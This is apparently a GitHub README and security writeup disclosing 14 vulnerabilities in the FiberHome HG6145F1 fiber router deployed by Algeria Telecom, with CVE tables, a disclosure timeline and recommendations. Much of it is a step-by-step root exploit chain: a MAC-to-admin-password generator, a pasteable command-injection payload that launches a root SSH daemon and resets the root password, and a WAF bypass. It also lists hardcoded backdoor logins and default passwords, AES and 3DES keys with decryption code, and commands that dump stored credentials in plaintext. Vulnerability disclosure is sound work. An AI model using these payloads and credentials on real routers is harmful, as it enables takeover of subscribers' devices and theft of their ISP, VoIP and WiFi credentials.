# FiberHome HG6145F1 — Full Access & Root Shell

**14 CVE-class vulnerabilities** in the FiberHome HG6145F1 GPON router (firmware RP4423), deployed by Algeria Telecom and other ISPs worldwide.

Complete attack chain: **MAC address -> admin password -> firmware upload -> remote code execution -> persistent root shell** in under 5 minutes.

By **Smothy (Rayane Merzoug)** & **izcarti** — [Numb Team](https://github.com/MrSmiiith)

---

## Vulnerabilities

| # | CVE | Vulnerability | CWE | CVSS | Impact |
|---|-----|--------------|-----|------|--------|
| 1 | [CVE-2026-37752](https://www.cve.org/CVERecord?id=CVE-2026-37752) | Predictable Admin Password (MD5 + static salt) | CWE-1391 | 8.8 | Full admin access from MAC address |
| 2 | [CVE-2026-37754](https://www.cve.org/CVERecord?id=CVE-2026-37754) | Remote Code Execution via `triger_speedtest` | CWE-78 | 9.8 | Root shell |
| 3 | [CVE-2026-37753](https://www.cve.org/CVERecord?id=CVE-2026-37753) | Hardcoded AES-128-ECB Key (`ABCDEFGHIJKLMNOP`) | CWE-321 | 7.5 | Decrypt all stored credentials |
| 4 | [CVE-2026-37755](https://www.cve.org/CVERecord?id=CVE-2026-37755) | Unsigned Firmware Upload (CRC32 only) | CWE-354 | 8.8 | Arbitrary code execution |
| 5 | [CVE-2026-37759](https://www.cve.org/CVERecord?id=CVE-2026-37759) | Unauthenticated Info Disclosure | CWE-200 | 5.3 | MAC address leak, chains with #1 |
| 6 | [CVE-2026-37760](https://www.cve.org/CVERecord?id=CVE-2026-37760) | XOR Config "Encryption" (no key needed) | CWE-327 | 7.5 | Offline credential recovery |
| 7 | [CVE-2026-37756](https://www.cve.org/CVERecord?id=CVE-2026-37756) | Boot Process Backdoor (UART) | CWE-912 | 9.0 | Root shell via serial console |
| 8 | [CVE-2026-37758](https://www.cve.org/CVERecord?id=CVE-2026-37758) | Cleartext HTTP Admin Interface | CWE-319 | 6.5 | Credential sniffing |
| 9 | [CVE-2026-37757](https://www.cve.org/CVERecord?id=CVE-2026-37757) | No CSRF Protection | CWE-352 | 6.5 | Remote admin action execution |
| 10 | Pending | All Services Run as Root | CWE-269 | 7.0 | Any vuln = instant root |
| 11 | Pending | Default Root Password (`root123`) | CWE-798 | 9.8 | SSH/telnet root access |
| 12 | Pending | Hardcoded Backdoor Credentials | CWE-798 | 9.8 | Superadmin access |
| 13 | Pending | Password Change Without Verification | CWE-620 | 8.1 | Account takeover |
| 14 | Pending | Superadmin Username Leak | CWE-200 | 5.3 | Chains with #13 |

---

## Quick Start -- Root Shell in 5 Minutes

### Automated (recommended)

```bash
pip install requests pycryptodome
python3 get_root.py
```

This will:
1. Detect the router's MAC address from ARP
2. Generate the admin password
3. Login to the web panel
4. Execute RCE to start SSH
5. Fix the interactive shell
6. Drop you into a root shell

### Manual

**Step 1:** Get the MAC address (router sticker or ARP table)

**Step 2:** Generate admin password
```bash
python3 passgen.py
# Enter MAC -> get 16-character admin password
```

**Step 3:** Login to `http://192.168.1.1` with `admin` / generated password

**Step 4:** Upload `custom-webui.bin` via Management > Local Upgrade (wait for "File upgrade failed" -- expected)

**Step 5:** Open browser console (F12) and paste:
```javascript
var x=new XMLHttpRequest();x.open('GET','/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid',false);x.send();var s=JSON.parse(x.responseText).sessionid;var x2=new XMLHttpRequest();x2.open('POST','/cgi-bin/ajax',false);x2.setRequestHeader('Content-type','application/x-www-form-urlencoded');x2.send('ajaxmethod=triger_speedtest&url=;/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:root123|chpasswd;/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa&sessionid='+s);
```

**Step 6:** Connect
```bash
ssh -p 2222 root@192.168.1.1
# password: root123
```

> **Note:** The default SSH login drops into FiberHome CLI instead of a real shell. The rootfs is read-only (UBIFS). See the full writeup for the shell fix using `mount --bind` overlays, or use `get_root.py` which handles it automatically.

---

## Files

| File | Description |
|------|-------------|
| `get_root.py` | Automated root shell -- full attack chain in one script |
| `passgen.py` | MAC address to admin password generator |
| `custom-webui.bin` | Patched firmware enabling RCE + SSH |
| `HG6145F1_Full_Writeup.md` | Full security research writeup with all 14 CVEs |

---

## Device Info

| Detail | Value |
|--------|-------|
| Vendor | FiberHome Telecommunication Technologies |
| Model | HG6145F1 |
| Firmware | RP4423 (compiled June 9, 2025) |
| Kernel | Linux 4.19.183 armv7l |
| SoC | Broadcom BCM6855X |
| Flash | UBIFS on UBI (read-only rootfs) |
| CGI API | 641 undocumented methods in `/www/cgi-bin/ajax` |

---

## Disclosure

| Date | Event |
|------|-------|
| December 27, 2025 | Vendor (FiberHome) and ISP (Algeria Telecom) contacted via email |
| March 15, 2026 | Full vulnerability chain documented |
| March 15, 2026 | CVE IDs requested |
| March 31, 2026 | 3+ months -- no response, public disclosure on GitHub |
| May 15, 2026 | 9 CVE IDs assigned by MITRE (CVE-2026-37752 through CVE-2026-37760) |

---

## Credits

- **Smothy (Rayane Merzoug)** -- Lead researcher, firmware RE, exploit development
- **izcarti** -- Research collaboration
- **Numb Team** -- R&D

## Responsible Disclosure

We contacted both **FiberHome** and **Algeria Telecom** via email regarding these vulnerabilities. After **3+ months with no response** from either party, we are publishing this research to help affected users understand and protect themselves.

We are not responsible for any misuse of this information.

## Disclaimer

This research is published strictly for **educational and defensive purposes** — to help subscribers understand the security risks of their home network equipment and learn how to protect themselves.

**Before applying any changes to your router**, contact your ISP/service provider to confirm you have authorization. Unauthorized access to network equipment you do not own is illegal.

All testing was performed on devices we own. The goal is to empower users with knowledge about their own equipment's security posture, not to facilitate unauthorized access to others' devices.
# FiberHome HG6145F1 (Algeria Telecom RP4423) — Full Security Research Writeup
# FiberHome HG6145F1 (Algeria Telecom RP4423) — Full Security Research Writeup

**By Smothy (Rayane Merzoug) & izcarti — Numb Team**
**Date: March 15, 2026**
**Device: FiberHome HG6145F1 | Firmware: RP4423 | ISP: Algeria Telecom**

---

## Table of Contents

1. [Overview](#overview)
2. [Attack Surface](#attack-surface)
3. [Vulnerability Chain](#vulnerability-chain)
4. [CVE-1: Predictable Admin Password](#cve-1-predictable-admin-password)
5. [CVE-2: Remote Code Execution](#cve-2-remote-code-execution)
6. [CVE-3: Hardcoded AES Key](#cve-3-hardcoded-aes-key)
7. [CVE-4: Unsigned Firmware Upload](#cve-4-unsigned-firmware-upload)
8. [CVE-5: Unauthenticated Info Disclosure](#cve-5-unauthenticated-info-disclosure)
9. [CVE-6: XOR Config Encryption](#cve-6-xor-config-encryption)
10. [CVE-7: Boot Process Backdoor](#cve-7-boot-process-backdoor)
11. [CVE-8: Cleartext HTTP](#cve-8-cleartext-http)
12. [CVE-9: No CSRF Protection](#cve-9-no-csrf-protection)
13. [CVE-10: No Privilege Separation](#cve-10-no-privilege-separation)
14. [CVE-11: Default Root Password](#cve-11-default-root-password)
15. [CVE-12: Hardcoded Backdoor Credentials](#cve-12-hardcoded-backdoor-credentials)
16. [CVE-13: Password Change Without Verification](#cve-13-password-change-without-verification)
17. [CVE-14: Superadmin Username Leak](#cve-14-superadmin-username-leak)
18. [Full Attack Chain](#full-attack-chain)
19. [Recommendations](#recommendations)

---

## Overview

The FiberHome HG6145F1 is a GPON fiber-to-the-home (FTTH) router deployed by Algeria Telecom across Algeria. Through reverse engineering with IDA Pro, binary analysis of the CGI binary and shared libraries, and live testing on a production device, we identified **14 CVE-class vulnerabilities** and multiple ISP-level network security issues that together allow complete compromise of the router, its subscribers, and access to ISP management infrastructure.

### Device Specifications

| Detail | Value |
|--------|-------|
| Vendor | FiberHome Telecommunication Technologies |
| Model | HG6145F1 |
| Firmware | RP4423 (compiled June 9, 2025) |
| Kernel | Linux 4.19.183 armv7l |
| SoC | Broadcom BCM6855X |
| Flash | UBIFS on UBI (read-only rootfs) |
| ISP | Algeria Telecom |

### Tools Used

- IDA Pro 9.1 with MCP plugin (remote decompilation)
- ARM cross-compiler (gcc-arm-linux-gnueabi)
- SSH root shell (dropbear on port 2222)
- tcpdump (built into firmware)
- Python 3 (AES decryption, CRC calculation)

---

## Attack Surface

### Exposed Services

| Port | Protocol | Service | Binding | Notes |
|------|----------|---------|---------|-------|
| 21 | TCP | vsftpd | :::21 (all) | FTP with admin user |
| 22 | TCP | dropbear | 0.0.0.0:22 (all) | ISP SSH backdoor, default password `root123` |
| 23 | TCP | load_cli | 0.0.0.0:23 (all) | Telnet with custom auth |
| 53 | TCP/UDP | dnsmasq | 192.168.1.1 | DNS resolver |
| 67 | UDP | udhcpd | 0.0.0.0 | DHCP server |
| 80 | TCP | nginx | 0.0.0.0:80 (all) | Web admin (HTTP only) |
| 1900 | UDP | hostapd | 0.0.0.0 | UPnP SSDP |
| 5060 | UDP | sip | 100.88.194.149 | VoIP SIP (ISP VLAN) |
| 5683 | UDP | filink_server | 0.0.0.0 | CoAP IoT protocol |
| 8840 | TCP | thttpd | 127.0.0.1 | Internal CGI server |

### CGI Binary Analysis

The CGI binary `/www/cgi-bin/ajax` (ARM ELF, 828KB, not stripped, debug info) contains **638 undocumented API methods** including:

- `do_cmd` — system command execution
- `do_jumplogin` — alternative login with backdoor credentials
- `triger_speedtest` — command injection vector
- `modify_password_not_check_oldpassword` — password change without verification
- `get_superadmin_userName` — ISP admin username disclosure
- `get_aes` — AES key retrieval
- `set_port_mirror_inter` — hardware port mirroring
- `modify_password_superadmin` — superadmin password change

---

## Vulnerability Chain

The complete attack chain from zero access to full ISP infrastructure compromise:

```
MAC Address (sticker/API)
    │
    ▼
CVE-1: Generate admin password (MD5 + AEJLY salt)
    │
    ▼
CVE-4: Upload custom firmware (.bin with CRC32 init=0)
    │
    ▼
CVE-2: RCE via triger_speedtest → root shell
    │
    ▼
CVE-3: Decrypt all stored credentials (AES ABCDEFGHIJKLMNOP)
    │
    ▼
CVE-11: SSH port 22 with default root:root123
    │
    └──► Full root access to device (uid=0)
```

---

## CVE-2026-37752: Predictable Admin Password

**CVE-2026-37752 | CWE-1391 | CVSS 8.8 High | GHSA-xmq5-547h-c54q**

### Description

The admin password is deterministically derived from the router's MAC address using MD5 with a static salt.

### Algorithm (reverse engineered from firmware)

```python
import hashlib

def mac_to_password(mac):
    md5 = hashlib.md5()
    md5.update(mac.upper().encode())
    md5.update(b"AEJLY")  # static salt
    digest = md5.hexdigest()

    UPPER = "ACDFGHJMNPRSTUWXY"
    LOWER = "abcdfghjkmpstuwxy"
    DIGIT = "2345679"
    SYMBOL = "!@$&%"

    vals = [int(c, 16) for c in digest[:20]]
    password = [''] * 16

    for i in range(16):
        v = vals[i]
        case = v % 4
        if case == 0: password[i] = UPPER[(v*2) % 17]
        elif case == 1: password[i] = LOWER[(v*2+1) % 17]
        elif case == 2: password[i] = DIGIT[6 - (v%7)]
        elif case == 3: password[i] = SYMBOL[4 - (v%5)]

    # Enforce all character classes at positions derived from vals[16-19]
    # [enforcement logic with collision avoidance]

    return ''.join(password)
```

### Impact

Anyone who knows the MAC address (printed on the device sticker, or obtainable via CVE-5 without authentication) can generate the admin password and gain full admin access.

### Proof of Concept

```bash
$ python3 passgen.py
Enter MAC address: XX:XX:XX:XX:XX:XX
Password: <16-char generated password>
```

---

## CVE-2026-37754: Remote Code Execution

**CVE-2026-37754 | CWE-78 | CVSS 9.8 Critical | GHSA-vw92-g596-f383**

### Description

The `triger_speedtest` CGI method passes user input directly to `system()` without sanitization.

### Vulnerable Code (decompiled from CGI binary at address 0x5c800)

```c
snprintf(cmd, 0x100, "/fhrom/bin/speedtest %s &", url_param);
system(cmd);
```

### Exploitation

```
POST /cgi-bin/ajax
Content-Type: application/x-www-form-urlencoded

ajaxmethod=triger_speedtest&url=;id&sessionid=SESSION_ID
```

Response: `{"session_valid":1,"ret":0}` — command executes as root (uid=0).

### Constraints

- Nginx WAF blocks `>` character in POST body
- Bypass: use `wget` for file operations, `tee` for output redirection
- Requires authenticated session (admin or user level)
- `system()` always returns `ret:0` regardless of command success

### Proof of Concept — Start SSH

```javascript
// Paste in browser console while logged into router admin
var x=new XMLHttpRequest();
x.open('GET','/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid',false);
x.send();
var s=JSON.parse(x.responseText).sessionid;
var x2=new XMLHttpRequest();
x2.open('POST','/cgi-bin/ajax',false);
x2.setRequestHeader('Content-type','application/x-www-form-urlencoded');
x2.send('ajaxmethod=triger_speedtest&url=;/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:root123|chpasswd;/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa&sessionid='+s);
```

Then: `ssh -p 2222 root@192.168.1.1` (password: root123)

---

## CVE-2026-37753: Hardcoded AES Key

**CVE-2026-37753 | CWE-321 | CVSS 7.5 High | GHSA-rj22-7j3c-hwqv**

### Description

All stored credentials (PPPoE, VoIP, WiFi, FTP passwords) are encrypted with a hardcoded AES-128-ECB key found in `libfhapi.so`.

### Key (from reverse engineering init_aes_key() function)

```c
// libfhapi.so
init_aes_key():  key[i] = i + 65  → "ABCDEFGHIJKLMNOP" (0x41-0x50)
init_aes_iv():   iv[i]  = i + 48  → "0123456789:;<=>?" (0x30-0x3F)
// ECB mode - IV not used
```

### Decryption

```python
from Crypto.Cipher import AES
key = bytes(range(65, 81))  # ABCDEFGHIJKLMNOP
cipher = AES.new(key, AES.MODE_ECB)

# From /fhconf/usrconfig_conf:
encrypted_pppoe_user = "4AABCF1125044D5269391442B8B3857E"
encrypted_pppoe_pass = "E0F5FDDEB31BAD94B0AF8C2124EE23A4"

print(cipher.decrypt(bytes.fromhex(encrypted_pppoe_user)).rstrip(b'\x00'))
# b'VNF40666371'
print(cipher.decrypt(bytes.fromhex(encrypted_pppoe_pass)).rstrip(b'\x00'))
# b'abcd1234'
```

### Impact

All stored credentials (PPPoE, VoIP, WiFi, FTP) can be decrypted offline by anyone with access to the config file or root shell.

---

## CVE-2026-37755: Unsigned Firmware Upload

**CVE-2026-37755 | CWE-354 | CVSS 8.8 High | GHSA-v2v7-xg62-26vr**

### Description

The firmware upgrade uses CRC32 with a non-standard init value (0 instead of 0xFFFFFFFF) as the only integrity check. No cryptographic signature.

### Firmware Header Format (reverse engineered from libLedState.so)

```
Offset  Size  Description
0x000   16    Hardware version (e.g., "WKE2.094.424A01")
0x010   16    Hardware version (compatible)
0x020   16    Hardware version (extended)
0x044   16    Software base version
0x053   7     Software version (e.g., "RP4423")
0x093   8     Author (wide chars, e.g., "A.D.E.L")
0x0A1   11    Date (e.g., "15.03.2026")
0x100   16    Magic: "~@$^*)+ATOS!#%&("
0x110   16    Hardware version (copy)
0x130   16    Software version (copy)
0x166   4     CRC32 of payload (little-endian, init=0)
0x170   16    Chip type ("BCM6855X")
0x1F0   16    Section count (ASCII, e.g., "1")
0x200   16    Section name (e.g., "patch_script")
0x220   16    Section size (ASCII, e.g., "466848")
0xE00   ...   Payload (ARM ELF binary)
```

### CRC32 Algorithm (custom init=0)

```python
def custom_crc32(data):
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
        table.append(crc)
    crc = 0  # INIT=0, not standard 0xFFFFFFFF
    for byte in data:
        crc = table[(byte ^ crc) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFF
```

### Upgrade Process (from update_handler state machine in libLedState.so)

1. Receive 0xE00 (3584) bytes → header
2. `handler_head()` — validate magic, parse sections, check HW/SW compatibility
3. Write payload data to buffer
4. `file_verify()` — CRC32 check (init=0)
5. `update_finalily_handler()` — execute payload as ARM binary

The payload is an ARM ELF that extracts embedded tar.gz of web files, applies bind mounts over the read-only `/www/` filesystem, and sets up root access.

---

## CVE-2026-37759: Unauthenticated Info Disclosure

**CVE-2026-37759 | CWE-200 | CVSS 5.3 Medium | GHSA-wqxj-5mr6-629m**

### Description

The CGI exposes sensitive device info without authentication.

### Proof of Concept

```bash
curl -s http://192.168.1.1/cgi-bin/ajax?ajaxmethod=get_base_info
```

Returns (no login required):
- MAC address
- GPON Serial Number
- Hardware/Software versions
- ONU registration state and LOID
- CPU/memory usage, system uptime
- Optical power levels (Tx/Rx)
- LAN port link status

**Critical chain**: MAC address → CVE-1 (generate admin password) → full admin access without any credentials.

---

## CVE-2026-37760: XOR Config Encryption

**CVE-2026-37760 | CWE-327 | CVSS 7.5 High | GHSA-cg4p-rwgg-67f8**

### Description

Config file export uses XOR with predictable counter. No key required.

### Algorithm (from libfhapi.so — fhapi_file_crypt_decrypt)

```c
for (i = len - len/9527; i != 2*len - len/9527; i++)
    output = getc(file) ^ (i + 9527);
```

### Impact

Any config file obtained from the router (via admin backup, TR-069 intercept, or physical access) can be decrypted offline to recover PPPoE, VoIP, and WiFi credentials.

---

## CVE-2026-37756: Boot Process Backdoor

**CVE-2026-37756 | CWE-912 | CVSS 9.0 Critical | GHSA-c65g-m6qc-5543**

### Description

Manufacturer backdoor in `/fhrom/fhshell/initialize.sh` allows root shell via serial console.

### Vulnerable Code

```bash
macaddr=$(uci get /fhdata/factory_conf.brmac.value | tr -d ":" | \
  tr [a-z] [A-Z] | tr [0123456789ABCDEF] [FEDCBA9876543210])
macaddr=${macaddr:6:6}

read -n9 -t 2 passwd
passwd1=${passwd:0:3}
passwd2=${passwd:3:6}
passwd_fh=$(echo -n $passwd1 | sha1sum | cut -d " " -f1)

if [ $passwd_fh == "ef431b3bb9e0f022134ebde6d2b87c66ca2c58d2" ]; then
    if [ $passwd2 == $macaddr ]; then
        echo "force exit!!"
        exit 0  # drops to root shell, bypasses ALL security init
    fi
fi
```

### Exploitation

1. Connect UART to serial console (3.3V, 115200 baud)
2. During 2-second boot window, enter 9 characters:
   - First 3: crack SHA1 `ef431b3b...` (only 17,576 lowercase possibilities)
   - Last 6: MAC address with character substitution `[0-9A-F] → [F-0]`
3. Boot process exits → root shell with uid=0

---

## CVE-2026-37758: Cleartext HTTP

**CVE-2026-37758 | CWE-319 | CVSS 6.5 Medium | GHSA-qgf2-jx6w-ghrg**

The web admin runs on HTTP port 80 only. No HTTPS. Client-side AES "encryption" uses the same hardcoded key from CVE-3, providing zero protection against network sniffing.

---

## CVE-2026-37757: No CSRF Protection

**CVE-2026-37757 | CWE-352 | CVSS 6.5 Medium | GHSA-9p7m-ghch-x93c**

No CSRF tokens. Session IDs from `get_refresh_sessionid` are predictable and obtainable via unauthenticated GET. No Origin/Referer validation. All admin actions (password change, firmware upload, reboot, RCE) are vulnerable to CSRF.

---

## CVE-10: No Privilege Separation

**CWE-269 | CVSS 7.0 High | GHSA-c4hw-qp7v-3p4c**

All services run as root:
- `nginx.conf`: `user root;`
- `thttpd.conf`: `user=root`
- No non-root accounts exist
- No SELinux, AppArmor, seccomp, or capabilities
- Any service vulnerability = immediate full root

---

## CVE-11: Default Root Password

**CWE-798 | CVSS 9.8 Critical | GHSA-5mxp-wf2w-f7c5**

### Description

Firmware ships with default root password `root123` in the read-only rootfs.

### Evidence

```
# /etc/passwd (read-only UBIFS)
root:$1$ydAwaEgU$ctlzLX4LFq874ZDkSM75W/:0:0:root:/:bin/sh
```

Cracked with common wordlist in <1 second: password is `root123`.

### SSH Exposure

ISP-installed Dropbear SSH on port 22 binds to `0.0.0.0` (all interfaces):
```
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2260/dropbear
```

With persistent host keys in `/fhconf/dropbear/`.

---

## CVE-12: Hardcoded Backdoor Credentials

**CWE-798 | CVSS 9.8 Critical | GHSA-jvx7-f359-f63g**

### Description

Hardcoded manufacturer backdoor in the CGI binary `do_jumplogin` function.

### Decompiled Code (IDA Pro, address 0x4ea20)

```c
if (!strcmp(s1, "fiberhomehg2x0") && !strcmp(v20, "CUAdmin")) {
    if (!strcmp(v29, "hg2x0"))
        v4 = 4;  // SUPERADMIN level 4
}
```

### Credentials

- **Username:** `fiberhomehg2x0`
- **Password:** `hg2x0`
- **Access:** Level 4 (superadmin — higher than admin level 2)
- **Active when:** Operator set to `CU` (China Unicom)
- **Present in:** ALL firmware images regardless of ISP deployment

The operator can be changed by modifying `/fhconf/sysinfo_conf` (writable persistent storage), activating the backdoor on any deployment including Algeria Telecom.

---

## CVE-13: Password Change Without Verification

**CWE-620 | CVSS 8.1 High | GHSA-gggh-vjpc-wcxj**

### Description

API method `modify_password_not_check_oldpassword` changes admin or user password without verifying the current password.

### Decompiled Code (address 0x3609c)

```c
int modify_password_not_check_oldpassword() {
    getValueByName(g_post_method_data, "login_user", s1);
    getValueByName(g_post_method_data, "new_password", v6);

    if (!strcmp(s1, word_B955C))  // admin
        set_single_xml_value("...WebSuperPassword", v6);
    else  // user
        set_single_xml_value("...WebPassword", v6);

    // NO old password check anywhere!
}
```

### Exploitation

```
POST /cgi-bin/ajax
ajaxmethod=modify_password_not_check_oldpassword&login_user=1&new_password=hacked
```

---

## CVE-14: Superadmin Username Leak

**CWE-200 | CVSS 5.3 Medium | GHSA-f4fw-28mm-xvq4**

The `get_superadmin_userName` API returns the ISP superadmin username from `WebAccountInfo.1.Username`. Combined with CVE-13, enables full superadmin account takeover.

---

## Full Attack Chain

### From Zero to ISP Infrastructure (step by step)

**Phase 1: Initial Access (5 minutes)**
1. Read MAC address from router sticker or via `get_base_info` API (unauthenticated)
2. Generate admin password using `passgen.py` (CVE-1)
3. Login to web admin at `http://192.168.1.1`

**Phase 2: Root Access (2 minutes)**
4. Upload `custom-webui.bin` via Management > Local Upgrade (CVE-4)
5. Wait for "File upgrade failed" (expected — changes applied)
6. Paste SSH activation JavaScript in browser console (CVE-2):
   ```javascript
   var x=new XMLHttpRequest();x.open('GET','/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid',false);x.send();var s=JSON.parse(x.responseText).sessionid;var x2=new XMLHttpRequest();x2.open('POST','/cgi-bin/ajax',false);x2.setRequestHeader('Content-type','application/x-www-form-urlencoded');x2.send('ajaxmethod=triger_speedtest&url=;/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:root123|chpasswd;/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa&sessionid='+s);
   ```
7. Fix interactive shell — rootfs is read-only (UBIFS), and `/etc/profile` runs
   `/fhrom/fhshell/fh_dropbear.sh` which launches the FiberHome CLI (`load_cli`)
   instead of a shell. Three mount --bind overlays are needed:
   ```bash
   # Via non-interactive SSH (commands work, interactive drops to CLI):
   sshpass -p root123 ssh -p 2222 root@192.168.1.1 '<commands below>'

   # a) Fix /etc/passwd — change relative "bin/sh" to absolute "/bin/ash"
   cp /etc/pass* /tmp/pwd
   sed -i "s,:bin/sh,:/bin/ash," /tmp/pwd
   mount -o bind /tmp/pwd /etc/pass*

   # b) Neutralize fh_dropbear.sh (prevents load_cli from hijacking SSH)
   echo "#!/bin/ash" > /tmp/noop.sh; chmod +x /tmp/noop.sh
   mount -o bind /tmp/noop.sh /fhrom/fhshell/fh_dropbear.sh

   # c) Clean /etc/profile (remove initialize.sh and CLI launcher)
   printf 'PS1="root@HG6145F1# "\nexport PATH=/fhrom/fhshell:/home/bin:/bin:/sbin:/usr/bin:/usr/sbin:/fhrom/bin\nexport LD_LIBRARY_PATH=/lib:/lib/gpl:/lib64:/usr/lib:/fhrom/lib\n' > /tmp/prof
   mount -o bind /tmp/prof /etc/profile
   ```
   **Note:** The nginx WAF blocks strings like `/etc/passwd` and `mount --bind` in
   POST parameters. Bypass using glob wildcards (`/etc/pass*`) or by writing
   commands to a script file via RCE and executing it separately.
8. `ssh -p 2222 root@192.168.1.1` (password: root123)
   **Or use the automated script:** `python3 get_root.py`

**Phase 3: Credential Extraction (1 minute)**
8. Read `/fhconf/usrconfig_conf` for encrypted credentials
9. Decrypt PPPoE/VoIP/WiFi passwords with AES key (CVE-3)
10. Read `/etc/passwd` — default root password is `root123` (CVE-11)

**Phase 4: Post-Exploitation**
11. Read `/fhconf/usrconfig_conf` — all credentials AES-encrypted with hardcoded key
12. Full filesystem access, service manipulation, persistent backdoor

---

## Recommendations

### For FiberHome (Vendor)

1. **Implement unique per-device admin passwords** (not derived from MAC)
2. **Sign firmware images** with RSA/ECDSA (not just CRC32)
3. **Remove all hardcoded credentials** (AES key, backdoor logins, default root password)
4. **Sanitize all user input** before passing to `system()` calls
5. **Run services as non-root** with privilege separation
6. **Enable HTTPS by default** with a unique per-device certificate
7. **Implement proper CSRF tokens** on all state-changing operations
8. **Remove manufacturer backdoors** from production firmware

### For ISPs Deploying This Device

1. **Change default root password** per-device during provisioning
2. **Restrict SSH port 22** to management network only
3. **Enable TR-069 over HTTPS** with mutual TLS authentication
4. **Monitor for anomalous traffic** from ONU ports

### For End Users

1. **Change admin password** immediately after setup
2. **Disable unused services** (FTP, telnet, UPnP)
3. **Use VPN** for sensitive traffic (ISP can see all unencrypted traffic)
4. **Monitor connected devices** regularly
5. **Do not share config backups** (all credentials are decryptable)

---

## Additional Findings

### Nginx WAF Bypass (CVE-2 hardening bypass)

The nginx reverse proxy blocks certain strings in POST parameters as a basic WAF:
- `/etc/passwd` — blocked
- `mount --bind` — blocked
- `/bin/sh` — blocked in some contexts

**Bypass:** Use shell glob wildcards (`/etc/pass*` instead of `/etc/passwd`) or write
commands to a temp script and execute it in a second RCE call. The WAF performs
simple string matching on the POST body — no regex or decoded matching.

### Read-Only Rootfs Shell Escape

The rootfs is mounted read-only (UBIFS): `ubi:rootfs2 on / type ubifs (ro)`.
Persistent modifications require `mount -o bind` overlays from `/tmp` (tmpfs).

Three files must be overlaid for a working interactive SSH shell:
1. `/etc/passwd` — shell field is `bin/sh` (relative path, resolves to FiberHome CLI)
2. `/fhrom/fhshell/fh_dropbear.sh` — intercepts SSH login, runs `load_cli`
3. `/etc/profile` — runs `initialize.sh` and `fh_dropbear.sh` on login

These overlays are lost on reboot. The `get_root.py` script automates the full chain.

## Responsible Disclosure

We contacted both **FiberHome** and **Algeria Telecom** via email regarding these vulnerabilities. After **3+ months with no response** from either party, we are publishing this research.

We are not responsible for any misuse of this information. This research is published for **educational purposes only** — to help subscribers understand and protect their home network equipment. Before applying any changes to your router, contact your ISP to confirm you have authorization.

## Disclosure Timeline

| Date | Event |
|------|-------|
| December 27, 2025 | Vendor (FiberHome) contacted via email |
| December 27, 2025 | ISP (Algeria Telecom) contacted via email |
| March 15, 2026 | Full vulnerability chain documented |
| March 15, 2026 | CVE IDs requested |
| March 31, 2026 | 3+ months — no response from vendor or ISP |
| March 31, 2026 | Public disclosure on GitHub |

---

## Credits

- **Smothy (Rayane Merzoug)** — Lead researcher, firmware reverse engineering, exploit development, custom firmware creation
- **izcarti** — Research collaboration
- **Numb Team** — Research & Development

## Additional Router Technical Details

### cfg_cmd — Plaintext Credential Dump (bypasses AES)

Beyond the AES-encrypted config file (CVE-3), the firmware includes a `cfg_cmd` binary that reads the TR-069 data model directly, returning ALL credentials in **plaintext** without any decryption needed:

```bash
export LD_LIBRARY_PATH=/fhrom/lib:/lib:/usr/lib

cfg_cmd get InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Username
cfg_cmd get InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Password
cfg_cmd get InternetGatewayDevice.Services.VoiceService.1.VoiceProfile.1.Line.1.SIP.AuthUserName
cfg_cmd get InternetGatewayDevice.Services.VoiceService.1.VoiceProfile.1.Line.1.SIP.AuthPassword
cfg_cmd get InternetGatewayDevice.ManagementServer.Username
cfg_cmd get InternetGatewayDevice.ManagementServer.Password
```

This means the AES encryption (CVE-3) is security theater — a second tool on the same device reads everything in cleartext.

### Hardcoded CLI Telnet Password

The telnet CLI (port 23) has a **hardcoded password derived from the MAC address** that the user CANNOT change:

```
Username: gpon
Password: Fh@{last 3 bytes of MAC uppercase}
Example:  Fh@5355D8  (for MAC BC:46:32:53:55:D8)
```

This password is burned into the read-only firmware. Even if the subscriber changes their web admin password, the CLI telnet password remains permanently accessible.

### Bootloader Hardcoded Credentials

The U-Boot bootloader contains additional hardcoded passwords discoverable via `fw_printenv`:

```bash
fw_printenv | grep pass
# default_support_password=Support!
# default_user_password=User!
```

### Firmware Encryption (3DES-CBC)

The full firmware image uses 3DES-CBC encryption:
- **Key:** `FIBERHOME_KEY` (13 bytes, null-padded to 24 bytes for 3DES)
- **IV:** `01234567`
- **Validation:** CRC32 (init=0) after decryption

The `decrypt_file_open` function in `libLedState.so` passes the C string `"FIBERHOME_KEY"` directly to OpenSSL's `EVP_DecryptInit_ex`. Since 3DES requires a 24-byte key, OpenSSL reads 24 bytes from the pointer: 13 key characters + 11 null bytes (`\x00`). To decrypt in Python:

```python
from Crypto.Cipher import DES3

KEY = b"FIBERHOME_KEY" + b"\x00" * 11   # 24 bytes
IV  = b"01234567"                         # 8 bytes

with open("firmware.bin", "rb") as f:
    header = f.read(0xE00)    # 3584-byte ATOS header (plaintext)
    payload = f.read()         # 3DES-CBC encrypted

cipher = DES3.new(KEY, DES3.MODE_CBC, IV)
decrypted = cipher.decrypt(payload)
```

The 3584-byte header (ATOS magic, HW/SW versions, CRC, section table) is **not encrypted**, only the payload after offset 0xE00.

### Flash Memory Layout

```
/dev/mtd0  — Bootloader (U-Boot)
/dev/mtd2  — Firmware image (encrypted)
/dev/mtd8  — Boot filesystem (kernel)
/dev/mtd9  — Root filesystem (read-only UBIFS)
```

Persistent writable partitions: `/fhconf/` (config), `/fhdata/` (factory data).

### Key Libraries for Reverse Engineering

| Library | Size | Purpose |
|---------|------|---------|
| `libfhapi.so` | — | AES key init, credential encryption |
| `libfhdrv_pon_api.so` | 136KB | PON user-space API (not stripped) |
| `libnomci.so` | 2MB | OMCI protocol library (not stripped) |
| `libLedState.so` | — | Firmware upgrade validation, CRC/3DES |
| `libponhwal.so` | 823KB | PON hardware abstraction |
| `libcli_cli.so` | — | CLI authentication logic |
